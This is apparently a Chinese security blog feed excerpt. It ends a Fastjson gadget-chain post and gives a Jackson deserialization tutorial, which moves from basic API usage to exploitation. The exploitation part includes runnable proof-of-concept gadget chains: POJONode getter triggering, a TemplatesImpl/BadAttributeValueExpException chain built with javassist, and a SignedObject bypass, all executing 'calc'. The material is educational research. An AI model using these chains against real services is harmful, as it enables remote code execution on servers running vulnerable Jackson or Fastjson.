@Overridepublic Object pack(Object obj) throws Exception &#123;    // JdkDynamicAopProxy    AdvisedSupport as = new AdvisedSupport();    as.setTargetSource(new SingletonTargetSource(obj));    Object o = ReflectionHelper.newInstance(&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;, new Class[]&#123;AdvisedSupport.class&#125;, as);    Proxy proxy = (Proxy) Proxy.newProxyInstance(Proxy.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, (InvocationHandler)o);    JSONObject map = new JSONObject();    map.put(&quot;ysomap&quot;, proxy);    return PayloadHelper.makeReadObjectToStringTrigger(map);&#125;

链子如下：
AutowireUtils$ObjectFactoryDelegatingInvocationHandler这个代理类在Spring1链子中有所使用，和JdkDynamicAopProxy类似，也能够反射调用方法，但是缺点在于其对象来自于this.objectFactory.getObject()的返回，需要找到能够返回恶意对象的代理类对objectFactory进行代理
观察ObjectFactoryDelegatingInvocationHandler的代码，也有反射调用方法的能力，不同之处在于反射对象是通过objectFactory.getObject()提供的。


我们的目标是让this.objectFactory.getObject()返回teamplatesImpl，让一个方法返回一个指定的对象，怎么看起来如此熟悉，这不就是前面提到的AnnotationInvocationHandler的作用之一吗？
但也正如前面分析，高版本jdk下的AnnotationInvocationHandler已经无法代理非注解类了，先简单看了一下org.springframework.beans.factory.ObjectFactory的子类，没有找到直接满足目标的。所以思路又回到了动态代理上面，能不能找到一个类似AnnotationInvocationHandler作用的动态代理，也即：通过动态代理调用，让特定方法返回一个指定的对象。
最终发现Fatsjson自身的com.alibaba.fastjson2.JSONObject就是一个满足需求的动态代理：可以让任意getter方法返回一个指定的对象。


最终方案：


用ObjectFactoryDelegatingInvocationHandler代理Templates接口，被调用getOutputProperties方法



用JSONObject代理ObjectFactoryDelegatingInvocationHandler中的objectFactory属性，返回teamplatesImpl



调用链如下：

上面两个动态代理绕过的代码可参考：https://github.com/Ape1ron/FastjsonInDeserializationDemo1
]]></content>
      <categories>
        <category>java反序列化</category>
      </categories>
  </entry>
  <entry>
    <title>java反序列化之jackson</title>
    <url>/2025/03/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bjackson/</url>
    <content><![CDATA[引用深入浅出解析Jackson反序列化
前言jackson相关基础知识这里就不赘述了，可参看引用
逻辑跟fastjson差不多
jackson简单使用依赖
&lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;            &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;            &lt;version&gt;2.9.3&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;            &lt;artifactId&gt;jackson-core&lt;/artifactId&gt;            &lt;version&gt;2.9.3&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;            &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt;            &lt;version&gt;2.9.3&lt;/version&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;

ObjectMapper将JSON映射到Java对象（反序列化），或者将Java对象映射到JSON（序列化）
Person类
package org.example;class Person &#123;    private String name;    private int age;    // 必须提供无参构造函数    public Person() &#123;        System.out.println(&quot;Person constructor&quot;);    &#125;    public String getName() &#123;        System.out.println(&quot;Person.getName()&quot;);        return name;    &#125;    public void setName(String name) &#123;        System.out.println(&quot;Person.setName()&quot;);        this.name = name;    &#125;    public int getAge() &#123;        System.out.println(&quot;Person.getAge()&quot;);        return age;    &#125;    public void setAge(int age) &#123;        System.out.println(&quot;Person.setAge()&quot;);        this.age = age;    &#125;&#125;

将json转换为对象
package org.example;import com.fasterxml.jackson.databind.ObjectMapper;public class Main &#123;    public static void main(String[] args) throws Exception&#123;        String json = &quot;&#123;\&quot;name\&quot;:\&quot;John\&quot;, \&quot;age\&quot;:30&#125;&quot;;        ObjectMapper objectMapper = new ObjectMapper();        Person person = objectMapper.readValue(json, Person.class);        System.out.println(&quot;Name: &quot; + person.getName());        System.out.println(&quot;Age: &quot; + person.getAge());    &#125;&#125;

将对象转换为json

writeValue()：将对象序列化为 JSON 并写入文件、输出流或 Writer。
writeValueAsString()：将对象序列化为 JSON 字符串。
writeValueAsBytes()：将对象序列化为 JSON 字节数组

package org.example;import com.fasterxml.jackson.databind.ObjectMapper;public class Main &#123;    public static void main(String[] args) throws Exception&#123;        ObjectMapper objectMapper = new ObjectMapper();        Person person = new Person();        person.setAge(21);        person.setName(&quot;Sherlock&quot;);        String jsonstring = objectMapper.writeValueAsString(person);        System.out.println(jsonstring);    &#125;&#125;

JsonParserJackson JsonParser类是一个底层一些的JSON解析器
Jackson JsonParser的运行层级低于Jackson ObjectMapper。 这使得JsonParser比ObjectMapper更快，但使用起来也比较麻烦
使用JsonParser需要先创建一个JsonFactory
package org.example;import com.fasterxml.jackson.core.JsonFactory;import com.fasterxml.jackson.core.JsonParser;public class Main &#123;    public static void main(String[] args) throws Exception&#123;        String json = &quot;&#123;\&quot;name\&quot;:\&quot;John\&quot;, \&quot;age\&quot;:30&#125;&quot;;        JsonFactory jsonFactory = new JsonFactory();        JsonParser parser = jsonFactory.createParser(json);        System.out.println(parser);    &#125;&#125;

一旦创建了Jackson JsonParser，就可以使用它来解析JSON；JsonParser的工作方式是将JSON分解为一系列令牌，可以一个一个地迭代令牌
可以使用JsonParser的nextToken()获得一个JsonToken。 可以使用此JsonToken实例检查给定的令牌
令牌类型由JsonToken类中的一组常量表示。 这些常量是
package org.example;import com.fasterxml.jackson.core.JsonFactory;import com.fasterxml.jackson.core.JsonParser;import com.fasterxml.jackson.core.JsonToken;public class Main &#123;    public static void main(String[] args) throws Exception&#123;        String json = &quot;&#123;\&quot;name\&quot;:\&quot;John\&quot;, \&quot;age\&quot;:30&#125;&quot;;        JsonFactory jsonFactory = new JsonFactory();        JsonParser parser = jsonFactory.createParser(json);        while(!parser.isClosed())&#123;            JsonToken jsonToken = parser.nextToken();            System.out.println(jsonToken);        &#125;    &#125;&#125;

START_OBJECTFIELD_NAMEVALUE_STRINGFIELD_NAMEVALUE_NUMBER_INTEND_OBJECTnull

指向的令牌是字符串字段值，则getValueAsString()返回当前令牌值作为字符串。 如果指向的令牌是整数字段值，则getValueAsInt()返回当前令牌值作为int值。 JsonParser具有更多类似的方法来获取不同类型的curren令牌值（例如boolean，short，long，float，double等）。
（下述例子中Prerson类的属性先改为public类型）
package org.example;import com.fasterxml.jackson.core.JsonFactory;import com.fasterxml.jackson.core.JsonParser;import com.fasterxml.jackson.core.JsonToken;public class Main &#123;    public static void main(String[] args) throws Exception&#123;        String json = &quot;&#123;\&quot;name\&quot;:\&quot;John\&quot;, \&quot;age\&quot;:30&#125;&quot;;        JsonFactory jsonFactory = new JsonFactory();        Person person = new Person();        JsonParser parser = jsonFactory.createParser(json);        while(!parser.isClosed()) &#123;            JsonToken jsonToken = parser.nextToken();            if (JsonToken.FIELD_NAME.equals(jsonToken)) &#123;                String fieldName = parser.getCurrentName();                System.out.println(fieldName);                jsonToken = parser.nextToken();                if (&quot;name&quot;.equals(fieldName)) &#123;                    person.name = parser.getValueAsString();                &#125; else if (&quot;age&quot;.equals(fieldName)) &#123;                    person.age = parser.getValueAsInt();                &#125;            &#125;            System.out.println(&quot;person&#x27;s name is &quot; + person.name);            System.out.println(&quot;person&#x27;s age is &quot; + person.age);        &#125;    &#125;&#125;

JsonGenerator用于从Java对象（或代码从中生成JSON的任何数据结构）生成JSON
使用JsonGenerator也需要先创建一个JsonFactory 从其中使用createGenerator() 来创建一个JsonGenerator
package org.example;import com.fasterxml.jackson.core.*;import java.io.File;public class Main &#123;    public static void main(String[] args) throws Exception &#123;        JsonFactory jsonFactory = new JsonFactory();        Person person = new Person();        JsonGenerator jsonGenerator = jsonFactory.createGenerator(new File(&quot;output.json&quot;), JsonEncoding.UTF8);        jsonGenerator.writeStartObject();        jsonGenerator.writeStringField(&quot;name&quot;, &quot;Sherlock&quot;);        jsonGenerator.writeNumberField(&quot;age&quot;, 21);        jsonGenerator.writeEndObject();        jsonGenerator.close();    &#125;&#125;

多态问题的解决大家都知道Java的多态就是同一个接口使用不同的实例而执行不同的操作
在Jackson中 JacksonPolymorphicDeserialization可以解决这个问题 在反序列化某个类对象的过程中 如果类的成员不是具体类型 比如是Object 接口 或者 抽象类 那么可以在JSON字符串中 指定其类型 Jackson将生成具体类型的实例
具体来说就是 将具体的子类信息绑定在序列化的内容中 以便于后续反序列化的时候 直接得到目标子类对象 我们可以通过DefaultTyping 和 @JsonTypeInfo 注解来实现
DefaultTypingDefaultTyping 是 Jackson 提供的一个枚举类，用于配置多态类型处理。它决定了在序列化和反序列化时，Jackson 如何处理对象的类型信息
Jackson提供一个enableDefaultTyping设置 包含四个值

下面简单分析下这四个值的作用
JAVA_LANG_OBJECT当被序列化或反序列化的类里的属性被声明为一个Object类型时 会对该Object类型的属性进行序列化和反序列化 并明确规定类名

仅对 Object 类型的属性启用类型信息嵌入。
例如，如果一个字段的类型是 Object，Jackson 会在序列化时嵌入类型信息

package jackson;import com.fasterxml.jackson.databind.ObjectMapper;public class JSTest &#123;    public static void main(String[] args) throws Exception&#123;        Person2 person2 = new Person2();        person2.age = 123;        person2.name = &quot;fakes0u1&quot;;        person2.object = new Hacker();        ObjectMapper objectMapper = new ObjectMapper();        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);        String jsonstring = objectMapper.writeValueAsString(person2);        System.out.println(jsonstring);        Person2 p2 = objectMapper.readValue(jsonstring,Person2.class);        System.out.println(p2);    &#125;&#125;

在设置了JAVA_LANG_OBJECT的时候会输出
&#123;&quot;name&quot;:&quot;fakes0u1&quot;,&quot;age&quot;:123,&quot;object&quot;:[&quot;jackson.Hacker&quot;,&#123;&quot;skill&quot;:&quot;moyu&quot;&#125;]&#125;Person2.age=123,Person2.name=fakes0u1,jackson.Hacker@f6c48ac

没设置的时候会输出
&#123;&quot;name&quot;:&quot;fakes0u1&quot;,&quot;age&quot;:123,&quot;object&quot;:&#123;&quot;skill&quot;:&quot;moyu&quot;&#125;&#125;Person2.age=123,Person2.name=fakes0u1,&#123;skill=moyu&#125;

OBJECT_AND_NON_CONCRETE对 Object 类型以及非具体类型（如抽象类、接口）启用类型信息嵌入
加上一个接口
package jackson;public interface Sex &#123;    public void setSex(int sex);    public int getSex();&#125;

和实现接口的类
package jackson;public class MySex implements Sex&#123;    int sex;    @Override    public void setSex(int sex)&#123;        this.sex = sex;    &#125;    @Override    public int getSex()&#123;        return sex;    &#125;&#125;

最后加上OBJECT_AND_NON_CONCRETE参数
package jackson;import com.fasterxml.jackson.databind.ObjectMapper;public class JSTest &#123;    public static void main(String[] args) throws Exception&#123;        Person2 person2 = new Person2();        person2.age = 123;        person2.name = &quot;fakes0u1&quot;;        person2.object = new Hacker();        person2.sex = new MySex();        ObjectMapper objectMapper = new ObjectMapper();        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);        String jsonstring = objectMapper.writeValueAsString(person2);        System.out.println(jsonstring);        Person2 p2 = objectMapper.readValue(jsonstring,Person2.class);        System.out.println(p2);    &#125;&#125;//输出结果：&#123;&quot;name&quot;:&quot;fakes0u1&quot;,&quot;age&quot;:123,&quot;object&quot;:[&quot;jackson.Hacker&quot;,&#123;&quot;skill&quot;:&quot;moyu&quot;&#125;],&quot;sex&quot;:[&quot;jackson.MySex&quot;,&#123;&quot;sex&quot;:0&#125;]&#125;Person2.age=123,Person2.name=fakes0u1,jackson.Hacker@239963d8,jackson.MySex@3abbfa04

可以看到接口也被成功的序列化和反序列化
NON_CONCRETE_AND_ARRAYS
对非具体类型（Non-Concrete Types）启用类型信息嵌入：
非具体类型包括抽象类（Abstract Classes）和接口（Interfaces）。
例如，如果一个字段的类型是 List（接口），Jackson 会在序列化时嵌入类型信息。


对数组类型（Arrays）启用类型信息嵌入：
数组类型包括基本类型数组（如 int[]）和对象数组（如 String[]）。
例如，如果一个字段的类型是 Object[]，Jackson 会在序列化时嵌入类型信息



package jackson;import com.fasterxml.jackson.databind.ObjectMapper;public class JSTest &#123;    public static void main(String[] args) throws Exception&#123;        Person2 person2 = new Person2();        person2.age = 123;        person2.name = &quot;fakes0u1&quot;;        Hacker[] hacker = new Hacker[2];        hacker[0] = new Hacker();        hacker[1] = new Hacker();        person2.object = hacker;        person2.sex = new MySex();        ObjectMapper objectMapper = new ObjectMapper();        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);        String jsonstring = objectMapper.writeValueAsString(person2);        System.out.println(jsonstring);        Person2 p2 = objectMapper.readValue(jsonstring,Person2.class);        System.out.println(p2);    &#125;&#125;&#123;&quot;name&quot;:&quot;fakes0u1&quot;,&quot;age&quot;:123,&quot;object&quot;:[&quot;[Ljackson.Hacker;&quot;,[&#123;&quot;skill&quot;:&quot;moyu&quot;&#125;,&#123;&quot;skill&quot;:&quot;moyu&quot;&#125;]],&quot;sex&quot;:[&quot;jackson.MySex&quot;,&#123;&quot;sex&quot;:0&#125;]&#125;Person2.age=123,Person2.name=fakes0u1,[Ljackson.Hacker;@e45f292,jackson.MySex@5f2108b5

这里直接就是这种形式
Hacker[] hackers = new Hacker[2]; // 创建长度为 2 的 Hacker 数组hackers[0] = new Hacker(&quot;Alice&quot;); // 为第一个元素分配一个 Hacker 对象hackers[1] = new Hacker(&quot;Bob&quot;); // 为第二个元素分配另一个 Hacker 对象

每个元素可以存储一个hacker对象的引用 这里的数组中的元素实际上是Hacker类的引用 并不是实际的对象 需要在使用之前通过实例化或赋值操作为数组元素分配实际的对象
NON_FINAL对所有非 final 类型（即可以被子类化的类型）启用类型信息嵌入
package jackson;public class Hacker &#123;    public String skill = &quot;moyu&quot;;&#125;class Person2&#123;    public String name = null;    public int age = 0;    public Object object;    public Sex sex;    public Hacker hacker;    @Override    public String toString()&#123;        return String.format(&quot;Person2.age=%d,Person2.name=%s,%s,%s,%s&quot;,age,name,object == null ? &quot;null&quot; : object,sex == null ? &quot;null&quot; : sex,hacker == null ? &quot;null&quot; : hacker);    &#125;&#125;



package jackson;import com.fasterxml.jackson.databind.ObjectMapper;public class JSTest &#123;    public static void main(String[] args) throws Exception&#123;        Person2 person2 = new Person2();        person2.age = 123;        person2.name = &quot;fakes0u1&quot;;        Hacker[] hacker = new Hacker[2];        hacker[0] = new Hacker();        hacker[1] = new Hacker();        person2.object = hacker;        person2.sex = new MySex();        person2.hacker = new Hacker();        ObjectMapper objectMapper = new ObjectMapper();        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);        String jsonstring = objectMapper.writeValueAsString(person2);        System.out.println(jsonstring);        Person2 p2 = objectMapper.readValue(jsonstring,Person2.class);        System.out.println(p2);    &#125;&#125;

@JsonTypeInfo注解@JsonTypeInfo注解是Jackson多态类型绑定的一种方式，支持下面5种类型的取值：
@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)@JsonTypeInfo(use = JsonTypeInfo.Id.CUSTOM)

JsonTypeInfo.Id.NONE用于指定在序列化和反序列化过程中不包含任何类型标识，不使用识别码
package jackson;import com.fasterxml.jackson.databind.ObjectMapper;public class JSTest &#123;    public static void main(String[] args) throws Exception&#123;        Person2 person2 = new Person2();        person2.age = 123;        person2.name = &quot;fakes0u1&quot;;        Hacker[] hacker = new Hacker[2];        hacker[0] = new Hacker();        hacker[1] = new Hacker();        person2.object = hacker;        ObjectMapper objectMapper = new ObjectMapper();        String jsonstring = objectMapper.writeValueAsString(person2);        System.out.println(jsonstring);        Person2 p2 = objectMapper.readValue(jsonstring,Person2.class);        System.out.println(p2);    &#125;&#125;

package jackson;import com.fasterxml.jackson.annotation.JsonTypeId;import com.fasterxml.jackson.annotation.JsonTypeInfo;public class Hacker &#123;    public String skill = &quot;moyu&quot;;&#125;class Person2&#123;    public String name = null;    public int age = 0;    @JsonTypeInfo(use = JsonTypeInfo.Id.NONE)    public Object object;    @Override    public String toString()&#123;        return String.format(&quot;Person2.age=%d,Person2.name=%s,%s&quot;,age,name,object == null ? &quot;null&quot; : object);    &#125;&#125;

输出
&#123;&quot;name&quot;:&quot;fakes0u1&quot;,&quot;age&quot;:123,&quot;object&quot;:[&#123;&quot;skill&quot;:&quot;moyu&quot;&#125;,&#123;&quot;skill&quot;:&quot;moyu&quot;&#125;]&#125;Person2.age=123,Person2.name=fakes0u1,[&#123;skill=moyu&#125;, &#123;skill=moyu&#125;]

因为是不使用识别码 所以输出没有什么不一样
JsonTypeInfo.Id.CLASS使用完全限定类名做识别
我们直接将person类中的注释修改为JsonTypeInfo.Id.CLASS 查看输出
&#123;&quot;name&quot;:&quot;fakes0u1&quot;,&quot;age&quot;:123,&quot;object&quot;:&#123;&quot;@class&quot;:&quot;jackson.Hacker&quot;,&quot;skill&quot;:&quot;moyu&quot;&#125;&#125;Person2.age=123,Person2.name=fakes0u1,jackson.Hacker@5702b3b1

我们可以看到 在序列化和反序列化的信息中 均有具体类的信息 在Jackson反序列化的时候如果使用了JsonTypeInfo.Id.CLASS修饰的话，可以通过@class的方式指定相关类，并进行相关调用。
JsonTypeInfo.Id.MINIMAL_CLASS当我们将object的注释修改为JsonTypeInfo.Id.MINIMAL_CLASS时
输出为
&#123;&quot;name&quot;:&quot;fakes0u1&quot;,&quot;age&quot;:123,&quot;object&quot;:&#123;&quot;@c&quot;:&quot;jackson.Hacker&quot;,&quot;skill&quot;:&quot;moyu&quot;&#125;&#125;Person2.age=123,Person2.name=fakes0u1,jackson.Hacker@4b952a2d

看起来就是将上面的@class的形式给简写了
JsonTypeInfo.Id.NAME将注释修改为JsonTypeInfo.Id.NAME后
序列化的输出变为
&#123;&quot;name&quot;:&quot;fakes0u1&quot;,&quot;age&quot;:123,&quot;object&quot;:&#123;&quot;@type&quot;:&quot;Hacker&quot;,&quot;skill&quot;:&quot;moyu&quot;&#125;&#125;

多出一个@type 这里并没有像上面的CLASS一样 给出具体包名和类名 同时在反序列化的时候还会报错 也就是说 这个注释并不适用于反序列化过程
JsonTypeInfo.Id.CUSTOM自定义识别码，由@JsonTypeIdResolver对应，由用户来自定义 并不能直接使用
通过上面的测试 我们发现在使用JsonTypeInfo.Id.CLASS和JsonTypeInfo.Id.MINIMAL_CLASS修饰Object类型的属性时 会触发Jackson的反序列化
反序列化中类属性方法的调用就是对jackson中多态的反序列化过程进行分析
使用DefaultTyping或者@JsonTypeInfo时都会调用相对应的setter方法
Jackson的反序列化的过程分为两步 第一步通过构造函数生成实例 第二步是对实例进行设置属性值
对其进行调试
跟进readValue方法，一直往下走

跟进deserialize方法


再跟进vanillaDeserialize方法

调用createUsingDefault函数 从而调用指定类的无参构造函数来生成类实例 跟进一下

跟进call方法

call函数中调用的方法很熟悉吧，生成实例，我们跟进去

调用了Person类的无参构造方法，从而完成了bean的实例化
在完成了类的实例化之后 就需要对类中的属性进行赋值 以键值对的形式进行匹配

以do while循环的形式对其中的属性进行赋值 跟进一下deserializeAndSet函数

检查属性类型随后跟进deserialize函数，这边属性是name所以跟进的是String类型的

先对其进行解析，获取name的内容

 然后到 set处，进行setter的反射调用

后面对于age字段的分析也类似，就不赘述了
如果说有向上面例子说的那样类的有一个字段是Object类型，并且有调用objectMapper.enableDefaultTyping方法或者@JsonTypeInfo注解的情况，那么当走到Object对象，比如是sex对像，那么在deserializeAndSet函数中就是调用deserializeWithType方法

跟进去，这里返回null 于是继续会走到deserializeTypedFromObject方法，走进去


随后会对MySex对象的构造函数进行调用
随后会和上面一样对MySex之中的属性进行赋值 会调用到set方法
jackson反序列化漏洞前提条件满足以下三个条件之一 存在Jackson反序列化漏洞 也就是我们上面提到过的 会触发json中的类解析的注解或者函数

调用了ObjectMapper.enableDefaultTyping()函数；
对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.CLASS的@JsonTypeInfo注解；
对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.MINIMAL_CLASS的@JsonTypeInfo注解；

漏洞原理当我们使用的JacksonPolymorphicDeserialization配置有问题的时候 Jackson反序列化会调用属性所属类的构造函数和setter方法 我们就可以在这里做文章
我们可以以要进行反序列化的类的属性是否为Object类分为两种
无Object我们从构造函数和setter方法入手
Person类
package org.example;class Person &#123;    public String name;    public int age;        public Person() throws Exception&#123;        System.out.println(&quot;Person constructor&quot;);        Runtime.getRuntime().exec(&quot;calc&quot;);    &#125;    public String getName() &#123;        System.out.println(&quot;Person.getName()&quot;);        return name;    &#125;    public void setName(String name) throws Exception&#123;        System.out.println(&quot;Person.setName()&quot;);        Runtime.getRuntime().exec(name);        this.name = name;    &#125;    public int getAge() &#123;        System.out.println(&quot;Person.getAge()&quot;);        return age;    &#125;    public void setAge(int age) &#123;        System.out.println(&quot;Person.setAge()&quot;);        this.age = age;    &#125;&#125;

payload
package org.example;import com.fasterxml.jackson.core.*;import com.fasterxml.jackson.databind.ObjectMapper;import java.io.File;public class Main &#123;    public static void main(String[] args) throws Exception &#123;        String json = &quot;&#123;\&quot;name\&quot;:\&quot;calc\&quot;, \&quot;age\&quot;:30&#125;&quot;;        ObjectMapper objectMapper = new ObjectMapper();        Person person = objectMapper.readValue(json, Person.class);        System.out.println(person);    &#125;&#125;

测试后会成功弹出两个计算器
有Object因为Object是任意类型的父类 因此扩大了我们的攻击面 我们只需要在目标服务端中存在的且构造函数或setter方法存在漏洞的类即可进行攻击利用 例如 存在一个恶意类Evil 在其构造函数或者是setter方法中存在任意代码执行漏洞
package org.example;public class Evil &#123;    public String cmd;    public void setCmd(String cmd) &#123;        this.cmd = cmd;        try &#123;            Runtime.getRuntime().exec(&quot;calc&quot;);        &#125;        catch (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;&#125;

然后我们将其写到json中
package org.example;import com.fasterxml.jackson.annotation.JsonTypeInfo;class Person2&#123;    public String name;    public int age;    public Person2()&#123;        System.out.println(&quot;person 构造函数&quot;);    &#125;    @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)    public Object object;&#125;

package org.example;import com.fasterxml.jackson.databind.ObjectMapper;public class Test &#123;    public static void main(String[] args) throws Exception&#123;        ObjectMapper objectMapper = new ObjectMapper();        objectMapper.enableDefaultTyping();        String jsonstring = &quot;&#123;\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;fakes0u1\&quot;,\&quot;object\&quot;:[\&quot;org.example.Evil\&quot;,&#123;\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;]&#125;&quot;;        Person2 p2 = objectMapper.readValue(jsonstring,Person2.class);        System.out.println(p2);    &#125;&#125;

可以成功执行calc

注意版本较低的看CVE-2017-7525和CVE-2017-17485；具体利用看引用，这里就不具体分析啦

通杀&gt;&#x3D;2.10这里测试用的版本是2.13.3
利用Jackson中的PojoNode 他的toString是可以直接触发任意的getter的 触发条件如下

不需要存在该属性
getter方法需要有返回值
尽可能的只有一个getter

User类
package org.example;import java.io.Serializable;public class User implements Serializable &#123;    public User() &#123;    &#125;    public Object getName() throws Exception &#123;        Runtime.getRuntime().exec(&quot;calc&quot;);        return &quot;asdas&quot;;    &#125;    public Object setName(String name) &#123;        System.out.println(&quot;setname&quot;);        return &quot;sadsad&quot;;    &#125;&#125;

Poc
package org.example;import com.fasterxml.jackson.databind.node.POJONode;public class Test &#123;    public static void main(String[] args) &#123;        User user = new User();        POJONode jsonNodes = new POJONode(user);        jsonNodes.toString();    &#125;&#125;

测试后成功弹计算器
TemplatesImpl链我们的POJONode是继承ValueNode的 ValueNode是继承BaseJsonNode的
而在BaseJsonNode中存在

意味着 我们在反序列化的时候 会经过这个writeReplace方法 这个方法会对我们的序列化过程进行检查 从而阻止我们的序列化进程
我们可以通过删除这个方法来跳过这个过程，但是发现 idea 无法修改源码，那么用 javassist 进行动态修改
package org.example;import com.fasterxml.jackson.databind.node.POJONode;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.*;import javax.management.BadAttributeValueExpException;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Field;public class Test &#123;    public static void main(String[] args) throws Exception &#123;        ClassPool pool = ClassPool.getDefault();        ClassPool.getDefault().insertClassPath(new LoaderClassPath(Person.class.getClassLoader()));        CtClass ctClass = ClassPool.getDefault().getCtClass(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;);        // 获取原方法        CtMethod originalMethod = ctClass.getDeclaredMethod(&quot;writeReplace&quot;);        // 修改方法名        originalMethod.setName(&quot;Replace&quot;);        // 加载修改后的类        ctClass.toClass();        CtClass clazz = pool.makeClass(&quot;sherlock&quot;);        CtClass superClass = pool.get(AbstractTranslet.class.getName());        clazz.setSuperclass(superClass);        CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;, clazz);        constructor.setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);        clazz.addConstructor(constructor);        byte[][] bytes = new byte[][]&#123;clazz.toBytecode()&#125;;        Templates templatesImpl = new TemplatesImpl();        setFieldValue(templatesImpl, &quot;_bytecodes&quot;, bytes);        setFieldValue(templatesImpl, &quot;_name&quot;, &quot;fakes0u1&quot;);        setFieldValue(templatesImpl, &quot;_tfactory&quot;, null);        POJONode jsonNodes = new POJONode(templatesImpl);        BadAttributeValueExpException exp = new BadAttributeValueExpException(null);        Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;);        val.setAccessible(true);        val.set(exp,jsonNodes);                ByteArrayOutputStream barr = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);        objectOutputStream.writeObject(exp);        objectOutputStream.close();        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));        objectInputStream.readObject();    &#125;        private static void setFieldValue(Object obj, String field, Object arg) throws Exception&#123;        Field f = obj.getClass().getDeclaredField(field);        f.setAccessible(true);        f.set(obj, arg);    &#125;&#125;

调试可以看到TemplateImpl链的大部分代码跟fastjson里面的相关链代码差不多，开始调试
通过BadAttributeValueExpException的readObject方法进入

跟进，到了BaseJsonNode的toString 调用InternalNodeMapper.nodeToString

调用ObjectWriter.writeValueAsString(Object value)

最终在serializeAsField中触发invoke 调用到TemplatesImpl.getOutputProperties
调用链如下（一张图截不下来）：



SignObject链在Templates被ban的情况下，打二次反序列化
package org.example;import com.fasterxml.jackson.databind.node.POJONode;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.*;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.net.URI;import java.security.*;import java.util.Base64;public class Test &#123;    public static void main(String[] args) throws Exception &#123;        ClassPool pool = ClassPool.getDefault();        ClassPool.getDefault().insertClassPath(new LoaderClassPath(Person.class.getClassLoader()));        CtClass ctClass = ClassPool.getDefault().getCtClass(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;);        // 获取原方法        CtMethod originalMethod = ctClass.getDeclaredMethod(&quot;writeReplace&quot;);        // 修改方法名        originalMethod.setName(&quot;Replace&quot;);        // 加载修改后的类        ctClass.toClass();        CtClass clazz = pool.makeClass(&quot;sherlock&quot;);        CtClass superClass = pool.get(AbstractTranslet.class.getName());        clazz.setSuperclass(superClass);        CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;, clazz);        constructor.setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);        clazz.addConstructor(constructor);        byte[][] bytes = new byte[][]&#123;clazz.toBytecode()&#125;;        TemplatesImpl templatesImpl = new TemplatesImpl();        setFieldValue(templatesImpl, &quot;_bytecodes&quot;, bytes);        setFieldValue(templatesImpl, &quot;_name&quot;, &quot;fakes0u1&quot;);        setFieldValue(templatesImpl, &quot;_tfactory&quot;, null);        POJONode jsonNodes2 = new POJONode(templatesImpl);        BadAttributeValueExpException exp2 = new BadAttributeValueExpException(null);        Field val2 = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;);        val2.setAccessible(true);        val2.set(exp2,jsonNodes2);                KeyPairGenerator keyPairGenerator;        keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;);        keyPairGenerator.initialize(1024);        KeyPair keyPair = keyPairGenerator.genKeyPair();        PrivateKey privateKey = keyPair.getPrivate();        Signature signingEngine = Signature.getInstance(&quot;DSA&quot;);        SignedObject signedObject = new SignedObject(exp2,privateKey,signingEngine);        POJONode jsonNodes = new POJONode(signedObject);        BadAttributeValueExpException exp = new BadAttributeValueExpException(null);        Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;);        val.setAccessible(true);        val.set(exp,jsonNodes);        ByteArrayOutputStream barr = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);        objectOutputStream.writeObject(exp);        objectOutputStream.close();        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));        objectInputStream.readObject();    &#125;    private static void setFieldValue(Object obj, String field, Object arg) throws Exception&#123;        Field f = obj.getClass().getDeclaredField(field);        f.setAccessible(true);        f.set(obj, arg);    &#125;&#125;

调试调试的时候前面都是一样的，但后面反射调用的是SignedObject.getObject()方法

